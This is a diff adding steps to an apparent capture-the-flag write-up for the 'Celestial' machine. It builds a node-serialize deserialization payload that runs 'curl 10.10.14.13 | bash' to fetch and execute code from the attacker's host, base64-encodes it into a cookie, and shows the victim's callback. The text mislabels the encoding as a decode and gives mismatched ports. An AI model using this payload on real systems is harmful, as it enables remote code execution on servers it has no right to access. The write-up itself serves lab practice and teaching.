@@ -85,3 +85,37 @@ var serialize = require('node-serialize');
 console.log("Serialized: \n" + serialize.serialize(y));
 ```
 
+We run it to get the payload:
+
+```bash
+❯ js serialize.js
+Serialized: 
+{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl 10.10.14.13 | bash', function(error, stdout, stderr) { console.log(stdout) });\n }"}
+```
+
+# IIFE (Inmediately Invoked Function Expression):
+
+Well, we already have the Payload ready, but it's not all there yet. In order for the server to execute our command, we will have to enter the IIFE in our payload, otherwise, no command will be executed when the server deserializes our serialized data. 
+
+For people who do not know what the IIFE is, here is a resource that will come in handy -> [https://www.geeksforgeeks.org/immediately-invoked-function-expressions-iife-in-javascript/](https://www.geeksforgeeks.org/immediately-invoked-function-expressions-iife-in-javascript/)
+
+![4](../../../assets/images/Celestial/4.png)
+
+
+Once the IIFE has been entered, we store the data in a file and apply a base64 decode:
+
+
+```bash
+❯ cat data | base64 -w 0
+eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtcbiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCAxMC4xMC4xNC4xMyB8IGJhc2gnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTtcbiB9KCkifQoKCgoKCgoKCgoKCgoK
+```
+
+Now that we have the data, we go back to Burp Suite and replace the cookie, we set up a server with Python on port 8082, click on resend and... surprise!! We have received the curl from the Victim Machine!!
+
+![5](../../../assets/images/Celestial/5.png)
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.85 - - [29/Dec/2024 21:30:34] "GET / HTTP/1.1" 200 -
+```
